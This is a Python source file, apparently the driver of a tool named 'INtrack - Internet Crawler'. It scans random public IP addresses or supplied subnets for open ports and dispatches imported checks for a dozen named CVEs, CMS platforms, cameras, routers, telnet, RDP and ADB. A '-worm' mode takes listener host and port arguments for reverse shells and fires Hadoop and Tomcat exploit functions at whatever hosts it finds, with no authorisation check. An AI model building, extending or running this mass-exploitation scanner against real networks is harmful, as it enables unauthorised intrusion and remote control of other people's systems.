#!/usr/bin/env python3

import sys
import argparse
import random
import socket
import urllib3
import concurrent.futures
from alive_progress import alive_bar

from lib.worms.vscode_sftp_worm import crawl_vscode_sftp
from lib.worms.microsoft_worm import microsoft_worm
from lib.worms.tomcat_worm import exploit_CVE_2017_12615_CVE_2017_12617
from lib.worms.hadoop_worm import hadoop_worm

from lib.exposures.robots_scanner import check_robots
from lib.exposures.security_scanner import check_security
from lib.exposures.sitemap_scanner import check_sitemap

from lib.miscellaneous.dir_listing import check_dir_listing

from lib.iot.gargoyle_scanner import check_gargoyle
from lib.iot.gpon_scanner import check_gpon
from lib.iot.webcamxp_scanner import check_webcamxp
from lib.iot.netgear_scanner import scan_netgear
from lib.iot.hikvision_scanner import check_hikvision
from lib.iot.cisco_scanner import check_cisco
from lib.iot.epmp_scanner import check_epmp
from lib.iot.network_camera import check_network_camera

from lib.instances.wordpress_scanner import check_wordpress
from lib.instances.microsoft_iis import check_microsoft_iis
from lib.instances.server_scanner import check_servers
from lib.instances.webmin_scanner import scan_webmin
from lib.instances.thinkphp import check_thinkphp
from lib.instances.weblogic_scanner import check_weblogic
from lib.instances.drupal import check_drupal
from lib.instances.ncast import check_ncast
from lib.instances.jira import check_jira
from lib.instances.joomla import check_joomla
from lib.instances.zimbra import check_zimbra

from lib.network.telnet_scanner import scan_telnet
from lib.network.rdp_scanner import scan_rdp
from lib.network.adb_misconfig import check_adb
from lib.network.network_handler import get_ips_from_subnet

from lib.vulns.CVE_2016_6277 import check_CVE_2016_6277
from lib.vulns.CVE_2024_0305 import check_CVE_2024_0305
from lib.vulns.CVE_2018_13379 import check_CVE_2018_13379
from lib.vulns.CVE_2017_7921 import check_CVE_2017_7921
from lib.vulns.CVE_2019_17382 import check_CVE_2019_17382
from lib.vulns.CVE_2019_1653 import check_CVE_2019_1653
from lib.vulns.CVE_2022_47945 import check_CVE_2022_47945
from lib.vulns.CVE_2021_36260 import check_CVE_2021_36260
from lib.vulns.CVE_2017_5487 import check_CVE_2017_5487
from lib.vulns.CVE_2017_7925 import check_CVE_2017_7925
from lib.vulns.CVE_2022_40684 import check_CVE_2022_40684
from lib.vulns.directory_traversal_scanner import traversal

from lib.color_handler import print_green, print_blue, print_red, print_yellow

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_ip():
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def check_port(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        try:
            s.connect((ip, port))
            return True
        except (socket.timeout, socket.error):
            return False

def parse_ports(port_str):
    ports = set()
    for part in port_str.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            if start > end:
                print_red(f"Invalid port range: {start}-{end}")
                continue
            ports.update(range(start, end + 1))
        else:
            port = int(part)
            if 1 <= port <= 65535:
                ports.add(port)
            else:
                print_red(f"Invalid port number: {port}")
    return sorted(ports)

def process_ip(ip, args):
    ports = parse_ports(args.p)
    lhost = args.lh
    lport = args.lp

    open_ports = [port for port in ports if check_port(ip, port)]
    if not open_ports:
        return None

    vuln_checks = [
        ('CVE-2017-7921', check_CVE_2017_7921),
        ('CVE-2019-17382', check_CVE_2019_17382),
        ('CVE-2018-13379', check_CVE_2018_13379),
        ('CVE-2022-47945', check_CVE_2022_47945),
        ('CVE-2021-36260', check_CVE_2021_36260),
        ('CVE-2017-5487', check_CVE_2017_5487),
        ('CVE-2017-7925', check_CVE_2017_7925),
        ('CVE_2024_0305', check_CVE_2024_0305),
        ('CVE_2016_6277', check_CVE_2016_6277),
        ('CVE_2019_1653', check_CVE_2019_1653),
        ('CVE_2022_40684', check_CVE_2022_40684),
        ('traversal', traversal)
    ]

    instance_checks = [
        ('wordpress', check_wordpress),
        ('microsoft', check_microsoft_iis),
        ('server', check_servers),
        ('webmin', scan_webmin),
        ('thinkphp', check_thinkphp),
        ('weblogic', check_weblogic),
        ('drupal', check_drupal),
        ('ncast', check_ncast),
        ('jira', check_jira),
        ('joomla', check_joomla),
        ('zimbra', check_zimbra)
    ]

    exposure_checks = [
        ('robots-txt', check_robots),
        ('security-txt', check_security),
        ('sitemap', check_sitemap)
    ]

    network_checks = [
        ('telnet', scan_telnet),
        ('rdp', scan_rdp),
        ('adb-misconfig', check_adb)
    ]

    iot_checks = [
        ('gargoyle', check_gargoyle),
        ('gpon', check_gpon),
        ('webcamxp', check_webcamxp),
        ('netgear', scan_netgear),
        ('hikvision', check_hikvision),
        ('cisco', check_cisco),
        ('epmp', check_epmp),
        ('network-camera', check_network_camera)
    ]

    miscellaneous_checks = [
        ('dir-listing', check_dir_listing)
    ]

    if args.worm and lhost and lport:
        worm_checks = [
            ('hadoop', lambda ip, port: hadoop_worm(ip, lhost, lport, port, args.timeout)),
            ('tomcat', lambda ip, port: exploit_CVE_2017_12615_CVE_2017_12617(ip, lhost, lport, port, args.timeout))
        ]

        for worm_name, worm_func in worm_checks:
            if args.worm == worm_name:
                for port in open_ports:
                    worm_func(ip, port)
                return ip
    elif args.worm:
        print_red("Error: Both -lh (lhost) and -lp (lport) must be provided with -worm.")
        sys.exit(1)

    for vuln, check_function in vuln_checks:
        if args.vuln == vuln and check_function(ip, open_ports, args.timeout):
            return ip

    for instance, check_function in instance_checks:
        if args.instance == instance and check_function(ip, open_ports, args.timeout):
            return ip

    for exposure, check_function in exposure_checks:
        if args.exposure == exposure and check_function(ip, open_ports, args.timeout):
            return ip

    for port, check_function in network_checks:
        if args.network == port:
            if check_function(ip, open_ports):
                return ip

    for iot, check_function in iot_checks:
        if args.iot == iot and check_function(ip, open_ports, args.timeout):
            return ip

    for miscellaneous, check_function in miscellaneous_checks:
        if args.miscellaneous == miscellaneous and check_function(ip, open_ports, args.timeout):
            return ip

    if open_ports and not (args.instance or args.vuln):
        return ip

    return None

def read_targets_from_file(filename):
    ips = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                target = line.strip()
                if '/' in target:
                    ips.extend(get_ips_from_subnet(target))
                else:
                    ips.append(target)
    except FileNotFoundError:
        print_red(f"Error: The file '{filename}' was not found.")
        sys.exit(1)
    return ips

def main():
    parser = argparse.ArgumentParser(description="INtrack - Internet Crawler")
    parser.add_argument("-host", type=str, help="Specify a single target IP or subnet range of IPs to scan /24, /23, /22, etc.")
    parser.add_argument("-f", type=str, help="Specify a file containing target IPs.")
    parser.add_argument("-n", type=int, help="Number of targets to find. Can also be used to increase the range of the scan.")
    parser.add_argument("-p", type=str, default="80", help="Port(s) to check. Defaults to 80 if not provided.")
    parser.add_argument("-t", type=int, default=25, help="Number of threads to use.")
    parser.add_argument("-o", type=str, help="Store results into a file.")
    parser.add_argument("-lh", "-lhost", type=str, help="Add a listening host for revshells.")
    parser.add_argument("-lp", "-lport", type=str, help="A listening port for revshells.")
    parser.add_argument("-instance", type=str, help="Type of instance to check.")
    parser.add_argument("-worm", type=str, help="Enable special script execution with a specified type (e.g., 'vscode-sftp').")
    parser.add_argument("-vuln", type=str, help="Enable vuln script execution with a specified type (e.g., CVE-2017-7921).")
    parser.add_argument("-exposure", type=str, help="Used to detect exposure files.")
    parser.add_argument("-iot", type=str, help="Used to detect IoT devices.")
    parser.add_argument("-miscellaneous", type=str, help="Used for miscellaneous checks.")
    parser.add_argument("-network", type=str, help="Used for network scans.")
    parser.add_argument("-timeout", type=int, default=10, help="Timeout seconds for web requests.")
    parser.add_argument("-spider", type=str, help="Specify the subnet range to scan if a result is found (e.g., /20, /24).")

    args = parser.parse_args()

    found_targets = []

    if args.host:
        ip_addresses = get_ips_from_subnet(args.host) if "/" in args.host else [args.host]
    elif args.f:
        ip_addresses = read_targets_from_file(args.f)
    else:
        if args.n is None or args.p is None:
            print_red("Error: You must provide both -n (number of targets) and -p (port) for internet scanning.")
            sys.exit(1)
        ip_addresses = [generate_ip() for _ in range(args.n)]

    with alive_bar(args.n or len(ip_addresses), title="[Scanning Internet]", enrich_print=False, bar="blocks") as instance_bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.t) as executor:
            for result in executor.map(lambda ip: process_ip(ip, args), ip_addresses):
                if result:
                    found_targets.append(result)
                instance_bar()

    if args.o:
        with open(args.o, 'a') as file:
            for target in found_targets:
                file.write(f"{target}\n")

    for targ in found_targets[:args.n]:
        print(targ)

if __name__ == "__main__":
    main()
